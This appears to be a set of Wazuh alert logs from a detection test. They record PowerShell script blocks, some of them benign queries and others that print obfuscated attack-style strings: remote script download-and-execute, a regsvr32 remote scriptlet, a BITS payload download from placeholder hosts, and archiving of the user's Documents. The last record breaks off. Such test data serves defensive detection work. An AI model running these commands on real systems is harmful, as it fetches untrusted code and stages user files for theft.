{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"9475418f-2118-4c6c-97a2-93bad3eb1de0","scriptBlockText":"$sampleId='PST-144'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722756","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-144'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 9475418f-2118-4c6c-97a2-93bad3eb1de0\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:36.8170975Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:36.8170975Z\",\"eventRecordID\":\"722756\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-144'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 9475418f-2118-4c6c-97a2-93bad3eb1de0\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-144'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"9475418f-2118-4c6c-97a2-93bad3eb1de0\"}}}","id":"1784280997.499590","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:37.708+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"672dcdfc-6ed8-4c9b-91bc-70b45b98497a","scriptBlockText":"$sampleId='PST-145'; $encoded='cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722760","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-145'; $encoded='cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 672dcdfc-6ed8-4c9b-91bc-70b45b98497a\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:37.1968030Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:37.1968030Z\",\"eventRecordID\":\"722760\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-145'; $encoded='cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 672dcdfc-6ed8-4c9b-91bc-70b45b98497a\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-145'; $encoded='cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"672dcdfc-6ed8-4c9b-91bc-70b45b98497a\"}}}","id":"1784280997.502275","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":14,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:37.719+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b558ef8a-0b65-4a6f-b624-fc7ce3a6720d","scriptBlockText":"$sampleId='PST-146'; $indicator='IEX (New-Object Net.WebClient).DownloadString(''https://stage.example.invalid/bootstrap.ps1'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722765","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-146'; $indicator='IEX (New-Object Net.WebClient).DownloadString(''https://stage.example.invalid/bootstrap.ps1'')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b558ef8a-0b65-4a6f-b624-fc7ce3a6720d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:37.5376177Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:37.5376177Z\",\"eventRecordID\":\"722765\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-146'; $indicator='IEX (New-Object Net.WebClient).DownloadString(''https://stage.example.invalid/bootstrap.ps1'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b558ef8a-0b65-4a6f-b624-fc7ce3a6720d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-146'; $indicator='IEX (New-Object Net.WebClient).DownloadString(''https://stage.example.invalid/bootstrap.ps1'')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b558ef8a-0b65-4a6f-b624-fc7ce3a6720d\"}}}","id":"1784280997.505434","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":6,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:36:37.729+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d357bc7b-7b86-4c10-b232-dc8d9492e0d0","scriptBlockText":"$sampleId='PST-147'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722781","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-147'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d357bc7b-7b86-4c10-b232-dc8d9492e0d0\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:37.8725309Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:37.8725309Z\",\"eventRecordID\":\"722781\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-147'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d357bc7b-7b86-4c10-b232-dc8d9492e0d0\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-147'; Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d357bc7b-7b86-4c10-b232-dc8d9492e0d0\"}}}","id":"1784280998.505434","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:38.762+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"4d72609f-a002-477f-be4f-5eda01cdf7f3","scriptBlockText":"$sampleId='PST-148'; Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722795","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-148'; Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 4d72609f-a002-477f-be4f-5eda01cdf7f3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:38.2123905Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:38.2123905Z\",\"eventRecordID\":\"722795\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-148'; Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 4d72609f-a002-477f-be4f-5eda01cdf7f3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-148'; Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"4d72609f-a002-477f-be4f-5eda01cdf7f3\"}}}","id":"1784280998.505434","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":6,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:36:38.856+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c80f57ed-5a21-4abe-bc4c-a6cbb0169246","scriptBlockText":"$sampleId='PST-149'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722798","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-149'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c80f57ed-5a21-4abe-bc4c-a6cbb0169246\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:38.5655191Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:38.5655191Z\",\"eventRecordID\":\"722798\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-149'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c80f57ed-5a21-4abe-bc4c-a6cbb0169246\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-149'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c80f57ed-5a21-4abe-bc4c-a6cbb0169246\"}}}","id":"1784280998.507939","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:38.902+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3d9538b8-9dd5-4595-9180-969e1859b685","scriptBlockText":"$sampleId='PST-150'; $indicator='Add-Type -MemberDefinition ''[DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr OpenProcess(uint access, bool inherit, int processId);'' -Name NativeMethods -Namespace Thesis.Inert'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722808","keywords":"0x0","level":"3","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-150'; $indicator='Add-Type -MemberDefinition ''[DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(uint access, bool inherit, int processId);'' -Name NativeMethods -Namespace Thesis.Inert'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3d9538b8-9dd5-4595-9180-969e1859b685\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"WARNING","systemTime":"2026-07-17T09:36:39.1743375Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"3\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:39.1743375Z\",\"eventRecordID\":\"722808\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"WARNING\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-150'; $indicator='Add-Type -MemberDefinition ''[DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr OpenProcess(uint access, bool inherit, int processId);'' -Name NativeMethods -Namespace Thesis.Inert'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3d9538b8-9dd5-4595-9180-969e1859b685\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-150'; $indicator='Add-Type -MemberDefinition ''[DllImport(\\\\\\\"kernel32.dll\\\\\\\")] public static extern IntPtr OpenProcess(uint access, bool inherit, int processId);'' -Name NativeMethods -Namespace Thesis.Inert'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3d9538b8-9dd5-4595-9180-969e1859b685\"}}}","id":"1784280999.507939","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:39.826+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d5ff756d-74bc-42fd-a4d8-ffab51fd269c","scriptBlockText":"$sampleId='PST-151'; $parts=@('Start-Bit','sTrans','fer -Sour','ce ''https','://bits.e','xample.inv','alid/payl','oad.bin',''' -Destinati','on ''$','env:TEMP\\\\ca','che.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722811","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-151'; $parts=@('Start-Bit','sTrans','fer -Sour','ce ''https','://bits.e','xample.inv','alid/payl','oad.bin',''' -Destinati','on ''$','env:TEMP\\ca','che.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d5ff756d-74bc-42fd-a4d8-ffab51fd269c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:39.4911845Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:39.4911845Z\",\"eventRecordID\":\"722811\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-151'; $parts=@('Start-Bit','sTrans','fer -Sour','ce ''https','://bits.e','xample.inv','alid/payl','oad.bin',''' -Destinati','on ''$','env:TEMP\\\\ca','che.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d5ff756d-74bc-42fd-a4d8-ffab51fd269c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-151'; $parts=@('Start-Bit','sTrans','fer -Sour','ce ''https','://bits.e','xample.inv','alid/payl','oad.bin',''' -Destinati','on ''$','env:TEMP\\\\\\\\ca','che.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d5ff756d-74bc-42fd-a4d8-ffab51fd269c\"}}}","id":"1784280999.507939","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:39.872+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"434c76b2-bcee-45d1-9327-614278686e82","scriptBlockText":"$sampleId='PST-152'; $indicator='Get-Chi`ldItem ''$env:USE`RPROFILE\\\\Doc`uments'' -Recurse | Co`mpress-Archi`ve -Destin`ationP`ath ''$env:TEMP\\\\co`llect.zip'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722825","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-152'; $indicator='Get-Chi`ldItem ''$env:USE`RPROFILE\\Doc`uments'' -Recurse | Co`mpress-Archi`ve -Destin`ationP`ath ''$env:TEMP\\co`llect.zip'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 434c76b2-bcee-45d1-9327-614278686e82\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:39.8252451Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:39.8252451Z\",\"eventRecordID\":\"722825\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-152'; $indicator='Get-Chi`ldItem ''$env:USE`RPROFILE\\\\Doc`uments'' -Recurse | Co`mpress-Archi`ve -Destin`ationP`ath ''$env:TEMP\\\\co`llect.zip'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 434c76b2-bcee-45d1-9327-614278686e82\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-152'; $indicator='Get-Chi`ldItem ''$env:USE`RPROFILE\\\\\\\\Doc`uments'' -Recurse | Co`mpress-Archi`ve -Destin`ationP`ath ''$env:TEMP\\\\\\\\co`llect.zip'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"434c76b2-bcee-45d1-9327-614278686e82\"}}}","id":"1784281000.510222","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":16,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:40.837+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"28b4c492-3489-41f7-a727-67a94f265339","scriptBlockText":"$sampleId='PST-153'; Get-ItemProperty -Path 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722826","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-153'; Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 28b4c492-3489-41f7-a727-67a94f265339\r\nPath: 